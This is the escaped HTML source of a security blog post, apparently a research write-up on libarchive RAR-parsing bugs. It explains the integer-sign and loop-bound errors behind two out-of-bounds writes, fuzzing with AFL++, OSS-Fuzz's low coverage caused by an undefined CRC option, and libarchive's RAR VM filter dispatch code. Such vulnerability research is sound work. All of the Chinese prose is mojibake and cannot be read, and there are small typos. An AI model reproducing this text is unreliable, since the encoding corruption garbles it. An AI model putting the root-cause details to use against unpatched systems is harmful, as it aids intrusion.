&lt;p&gt;åˆ°ç›®å‰ç‚ºæ­¢ï¼Œä¸é›£ç™¼ç¾ libarchive å¸¶ä¾†è¨±å¤šæ”»æ“Šé¢ã€‚å¯¦éš›ä¸Šï¼ŒWindwos ä¹Ÿåœ¨ 2024 çš„ 1 æœˆä¿®å¾©äº†å¾®è»Ÿç ”ç©¶åœ˜éšŠ Microsoft Offensive Research Security Engineering (MORSE) team å›å ±çš„å…©å€‹æ¼æ´ï¼Œåˆ†åˆ¥æ˜¯èˆ‡ &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20696&quot;&gt;CVE-2024-20696&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20697&quot;&gt;CVE-2024-20697&lt;/a&gt; å…©å€‹ RCE æ¼æ´ã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20696-oob-write-in-copy_from_lzss_window_to_unp&quot;&gt;CVE-2024-20696: OOB Write In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;CVE-2024-20696 ç™¼ç”Ÿåœ¨ libarchive è§£å£“ç¸® RAR æ ¼å¼çš„æª”æ¡ˆæ™‚å€™ã€‚åœ¨è§£å£“ç¸®çš„éç¨‹ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt; çš„ç¬¬å››å€‹åƒæ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; æ˜¯æ ¹æ“š lzss è§£å£“ç¸®å¾Œçš„ç‹€æ…‹è¨ˆç®—å‡ºçš„ copy lengthã€‚ç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt; åœ¨é€™è£¡éŒ¯èª¤åœ°å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; å®šç¾©ç‚º intï¼Œå°è‡´æ”»æ“Šè€…å¯ä»¥é€éæ§‹é€  lzss å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; è®Šç‚ºè² æ•¸ï¼Œå¾è€Œç¹éæª¢æŸ¥é€ æˆè¶Šç•Œå¯«çš„æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20697-oob-write-in-execute_filter_e8&quot;&gt;CVE-2024-20697: OOB Write In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;CVE-2024-20697 ä¹Ÿç™¼ç”Ÿåœ¨ libarchive è§£å£“ç¸® RAR æ ¼å¼çš„æª”æ¡ˆæ™‚å€™ã€‚å¦‚æœ RAR æª”æ¡ˆæœ‰ä½¿ç”¨åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter e8&lt;/code&gt; æ™‚ï¼ˆRAR æª”æ¡ˆæ ¼å¼çš„ filterï¼Œèˆ‡ libarchive çš„ filter ç„¡é—œï¼‰ï¼Œè§£å£“ç¸®ä¾¿æœƒè§¸ç™¼ libarchive çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt;ã€‚
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt; åœ¨æª¢æŸ¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; æ™‚é›–ç„¶æ˜¯æª¢æŸ¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; å¿…é ˆå¤§æ–¼ç­‰æ–¼ 4ï¼Œä½†æ˜¯åœ¨è¿´åœˆè¨ˆç®—å»ä½¿ç”¨äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length - 5&lt;/code&gt;ï¼Œæ‰€ä»¥ç•¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;legnth&lt;/code&gt; ç‚º 4 æ™‚ï¼Œè¿´åœˆä¾¿æœƒåŸ·è¡Œ 0x100000000 æ¬¡ï¼Œå°è‡´è¶Šç•Œå¯«ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;fuzzing-why-oss-fuzz-never-found-hese&quot;&gt;Fuzzing: Why OSS-Fuzz Never Found hese?&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å¾©ç¾é€™å…©å€‹ CVE æ™‚ï¼Œç”±æ–¼éœ€è¦æ§‹é€  RARï¼Œè£½ä½œèµ·ä¾†è¼ƒè€—è²»æ™‚é–“ï¼Œä¾‹å¦‚åœ¨ CVE-2024-20696 ä¸­éœ€è¦æ§‹é€  lzss ä½¿å¾— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; çš„è¨ˆç®—çµæœç‚ºè² æ•¸ï¼Œè€Œåœ¨ CVE-2024-20697 ä¸­æˆ‘å€‘éœ€è¦æ”¾å…¥ filter e8ï¼Œåœ¨æ§‹é€ ä¸Šè¼ƒç‚ºéº»ç…©ã€‚å› æ­¤æˆ‘å€‘é€é AFL++ ï¼Œå°‡åˆæ³•çš„ RAR ä»¥åŠæœ‰ä½¿ç”¨ filter e8 çš„ RAR ä½œç‚º seed é€²è¡Œ Fuzzingã€‚æ„å¤–çš„æ˜¯ï¼Œåƒ…åœ¨ 56 ç§’ä¹‹å…§æˆ‘å€‘å°±æ‰¾åˆ°äº†ä¸€å€‹ CVE-2024-20697 çš„ crashï¼š
&lt;img src=&quot;/assets/img/blog/20250212/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾ˆå¿«å°±èƒ½æ‰¾åˆ° crash ç•¶ç„¶æ˜¯å¥½äº‹ï¼Œä½†é€™è£¡æœ‰ä¸€å€‹å¤§å•é¡Œï¼šOSS-Fuzz è‡³å°‘å¾ 2016 å¹´é–‹å§‹å°± 24 å°æ™‚å…¨å¹´ç„¡ä¼‘çš„å° libarchive é€²è¡Œ Fuzzingï¼Œ56 ç§’å°±èƒ½å¤ æ‰¾åˆ° crash çš„æ¼æ´æ€éº¼å¯èƒ½é‚„æ²’æœ‰è¢«ç™¼ç¾å‘¢ï¼Ÿ
&lt;img src=&quot;/assets/img/blog/20250212/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾ OSS-Fuzz å° libarchive çš„ç¸½çµå¯ä»¥çœ‹åˆ°ï¼Œå…­æœˆæ™‚ï¼ŒOSS-Fuzz å° libarchive é€²è¡Œçš„ Fuzzing çš„è¦†è“‹ç‡åƒ…æœ‰ 15.03%:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œä¸”çœ‹èµ·ä¾†å·²ç¶“æŒçºŒäº†å¾ˆé•·ä¸€æ®µæ™‚é–“ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾æª”æ¡ˆä¾†çœ‹ï¼Œå¯ä»¥ç™¼ç¾æœ‰äº› format åŸºæœ¬ä¸Šæ²’æœ‰è¢«æ¸¬è©¦éï¼Œä¾‹å¦‚ RAR çš„è¦†è“‹ç‡åƒ…æœ‰ 4.07%
&lt;img src=&quot;/assets/img/blog/20250212/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;è¬åº•æ­æ›‰&quot;&gt;è¬åº•æ­æ›‰&lt;/h4&gt;

&lt;p&gt;åœ¨æˆ‘å€‘æº–å‚™æ¼”è¬›çš„åŒæ™‚ï¼Œlibarchive çš„ GitHub ä¸Šæœ‰å€‹é—œæ–¼ OSS-Fuzz çš„ commitã€‚ä»–æ˜¯é€™éº¼èªªçš„ï¼š libarchive åœ¨æäº¤çµ¦ OSS-Fuzz åŸ·è¡Œçš„è¨­å®šä¸­ï¼Œå‘¼å« CMake æ™‚é›–ç„¶æœ‰å•Ÿç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt;ï¼Œä½†å»å¾ä¾†éƒ½æ²’æœ‰åœ¨ CMake ä¸­å¥½å¥½å®šç¾©é€™å€‹ optionï¼
&lt;img src=&quot;/assets/img/blog/20250212/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ¬ä¾†ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt; é€™å€‹ flag æœƒè®“ libarchive åœ¨ CRC ä¸ç¬¦çš„æƒ…æ³ä¸‹ä¹Ÿç¹¼çºŒè™•ç†è©²æª”æ¡ˆã€‚è€Œæˆ‘å€‘éƒ½çŸ¥é“ Fuzzer ä¸€ç›´éƒ½ä¸æ“…æ–¼æ§‹é€ å‡ºæ­£ç¢ºçš„ checksumã€‚ä¹Ÿå°±æ˜¯èªª OSS-Fuzz è¦†è“‹ç‡é•·æœŸä½ä¸‹çš„åŸå› æ˜¯å› ç‚º Fuzzer ç„¡æ³•ç”¢ç”Ÿå‡ºåˆæ³•çš„ CRC ä¾†é€šéæª¢æŸ¥ï¼Œå°è‡´ Fuzzer æ°¸é å¡åœ¨ libarchive æª¢æŸ¥ CRC çš„é‚è¼¯ä¹‹ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;ä¿®æ­£ä¹‹å¾Œå¯ä»¥çœ‹åˆ° OSS-Fuzz å° libarchive çš„è¦†è“‹ç‡æœ‰é£›èºæ€§çš„æå‡ï¼Œå¾ 15.03% æå‡åˆ° 63.10%ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾å€‹åˆ¥æª”æ¡ˆçš„è¦†è“‹ç‡ä¾†çœ‹ä¹Ÿå¯ä»¥ç™¼ç¾å¤§éƒ¨åˆ†çš„æª”æ¡ˆæ ¼å¼è¦†è“‹ç‡å¤§å¹…æå‡ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;keep-fuzzing&quot;&gt;Keep Fuzzing&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€²è¡Œ code review çš„åŒæ™‚æˆ‘å€‘è®“ AFL++ ç¹¼çºŒç‚ºæˆ‘å€‘å‹å‹•ï¼Œé™¤äº†æˆ‘å€‘æ¥ä¸‹ä¾†å³å°‡æåˆ°çš„ RCE æ¼æ´ä¹‹å¤–ï¼Œæˆ‘å€‘é‚„é€é Fuzzing æ‰¾åˆ°äº† CVE-2024-48957ã€CVE-2024-48958 å…©å€‹è¶Šç•Œè®€æ¼æ´ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26256-libarchive-remote-code-execution-vulnerability&quot;&gt;CVE-2024-26256: Libarchive Remote Code Execution Vulnerability&lt;/h3&gt;

&lt;p&gt;åœ¨åˆ†æäº†å¾®è»Ÿè‡ªè¡Œå›å ±çš„ CVE-2024-20696 ä»¥åŠ CVE-2024-20697 ä¹‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾é€™å…©å€‹æ¼æ´çš†å‡ºç¾åœ¨è§£æ RAR çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; ä¸­ï¼Œè€Œä¸”éƒ½æ˜¯è¿‘ä¸‰å¹´åŠ å…¥çš„ featureã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥æˆ‘å€‘æ±ºå®šå¾ RAR é–‹å§‹é€²è¡Œæª¢æŸ¥ï¼Œçœ‹çœ‹æ˜¯å¦é‚„èƒ½ç™¼ç¾å…¶ä»–æ¼æ´ã€‚è€Œæˆ‘å€‘ç¬¬ä¸€å€‹æƒ³çŸ¥é“çš„æ˜¯ï¼ŒCVE-2024-20697 æˆå› ä¸­çš„ã€Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt;ã€æ˜¯ä»€éº¼? Commit message çš„ã€Œsupport rar filtersã€çš„ã€Œfiltersã€æ˜¯ä»€éº¼ï¼Ÿ&lt;/p&gt;

&lt;h4 id=&quot;rar-ä¸­çš„-vm&quot;&gt;RAR ä¸­çš„ VM&lt;/h4&gt;

&lt;p&gt;è¦çŸ¥é“ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt; æ˜¯ä»€éº¼ï¼Œæˆ‘å€‘é¦–å…ˆå¾—å…ˆçŸ¥é“ï¼šå…¶å¯¦ RAR ä¸­æœ‰ä¸€å€‹ VMï¼RAR å¯¦éš›ä¸ŠåŒ…å«äº†ä¸€å€‹ register-based VMï¼Œé€™å€‹ VM å¯ä»¥åŸ·è¡Œè‡ªè¨‚çš„å°ç¨‹å¼ä¾†å¢åŠ  RAR çš„å£“ç¸®æ¯”ã€‚å…·é«”æ–¹å¼å°±æ˜¯åœ¨å»ºç«‹ RAR æª”æ¡ˆæ™‚ï¼Œå¯ä»¥åœ¨è£¡é¢æ”¾å…¥å®¢è£½çš„ã€Œfilterã€å°ç¨‹å¼ï¼Œæ‰€ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt; å¯¦éš›ä¸Šå°±æ˜¯é€™éº¼ä¸€å€‹ç¨‹å¼ï¼Œä»–æ˜¯å°ˆé–€ç‚ºäº† Intel çš„ binary æ‰€ç”¢ç”Ÿçš„ä¸€å€‹å¢åŠ å£“ç¸®æ¯”çš„ç¨‹å¼ï¼Œè€Œåç¨±ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e8&lt;/code&gt; æºè‡ªæ–¼ Intel æŒ‡ä»¤é›†ä¸­ near call çš„ opcodeï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯ call instruction èˆ‡æ”¹å–„å£“ç¸®æ¯”ä¹‹é–“çš„é—œä¿‚æ˜¯ä»€éº¼ï¼Ÿä»¥ä¸‹é¢çš„ç¨‹å¼ç‚ºä¾‹ï¼Œå‡è¨­åœ¨ç¨‹å¼ä¸­ï¼Œæœ‰å…©å€‹ä½ç½®å‘¼å«äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcA&lt;/code&gt;ï¼Œç¨‹å¼æœƒç”¢ç”Ÿå…©å€‹ call æŒ‡ä»¤ï¼Œåœ¨é€™è£åˆ†åˆ¥æ˜¯ä½ç½® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; èˆ‡ä½ç½® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt;ã€‚åœ¨ Intel çš„æ©Ÿå™¨èªè¨€ä¸­ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ° near call æ˜¯ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xe8&lt;/code&gt; é–‹é ­ï¼Œå¾Œé¢è·Ÿè‘—å››å€‹ bytesï¼Œä¹Ÿå°±æ˜¯æ‰‹å†Šä¸­èªªçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt;ã€‚&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; å³æ˜¯å‘¼å«çš„ç›®æ¨™èˆ‡ä¸‹ä¸€æ¢æŒ‡ä»¤çš„ç›¸å°ä½ç½®ï¼Œä»¥ç¬¬ä¸€æ¢ call æŒ‡ä»¤ä¾†çœ‹ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1b&lt;/code&gt;ï¼Œå³æ˜¯å‘¼å«çš„ç›®æ¨™ï¼ˆ0x20ï¼‰ï¼Œæ¸›å»ä¸‹ä¸€æ¢æŒ‡ä»¤ï¼ˆ0+5ï¼‰æ‰€å¾—å‡ºçš„ç›¸å°ä½ç½® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1b&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™å…©æ¢æŒ‡ä»¤é›–ç„¶çš†æ˜¯å‘¼å« funcAï¼Œä½†ç”±æ–¼å…§å®¹ä¸åŒï¼Œåœ¨é€²è¡Œå£“ç¸®æ™‚è¡¨ç¾å°±è¼ƒå·®ã€‚é‚£æ—¢ç„¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; æ˜¯å¯ä»¥ç°¡å–®è¨ˆç®—ä¾†çš„ï¼Œé‚£åªè¦å…ˆæŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; çš„ä½ç½®éƒ½å…ˆæ›¿æ›æˆç›®æ¨™çš„ä½ç½®ï¼Œæ©Ÿå™¨èªè¨€æœƒå°±é•·å¾—ä¸€æ¨£ï¼Œå£“ç¸®æ¯”å°±èƒ½å¤ é€²ä¸€æ­¥ä¸Šå‡ï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨è§£å£“ç¸®æ™‚ï¼Œåªè¦å°‡æŠŠè¢«æ›¿ä»£æ‰çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; é€éè¨ˆç®—é‚„åŸå›ä¾†å°±å¥½äº†ï¼Œé€™ä¸€æ­¥ä¾¿æ˜¯ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e8 filter&lt;/code&gt; å°‡ä¹‹å¾©åŸã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œ libarchive çš„å¯¦ä½œç‚ºäº†ç°¡åŒ–ï¼Œä¸¦æ²’æœ‰å¯¦ä½œæ•´å€‹ VMï¼Œè€Œæ˜¯å–®ç´”å°‡ filter ç¨‹å¼çš„å…§å®¹é€²è¡Œ crc32 é‹ç®—ï¼Œä¸¦å°‡çµæœä½œç‚º fingerprintï¼Œç›´æ¥åŸ·è¡Œå°æ‡‰çš„ filterï¼Œåƒè€ƒ &lt;a href=&quot;https://github.com/libarchive/libarchive/blob/42565b88b5cc7441239269902a9d1735fd9ca0e2/libarchive/archive_read_support_format_rar.c#L3826&quot;&gt;libarchive&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;execute_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_virtual_machine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1D0E06077D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x35AD576887&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x393CD7E57E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x951C2C5DC8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_rgb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD8BC85E701&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_audio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;archive_set_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ARCHIVE_ERRNO_FILE_FORMAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;No support for RAR VM program filter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨ RAR v5 ä¹‹å¾Œï¼Œfilter åœ¨ RAR ä¸­è®Šæˆäº† enum é¡å‹ï¼Œåªèƒ½é¸ç”¨é å…ˆå®šç¾©å¥½çš„ filterï¼Œå¯ä»¥åƒè€ƒ &lt;a href=&quot;https://www.rarlab.com/rar_add.htm&quot;&gt;UnRAR source&lt;/a&gt;:&lt;/p&gt;

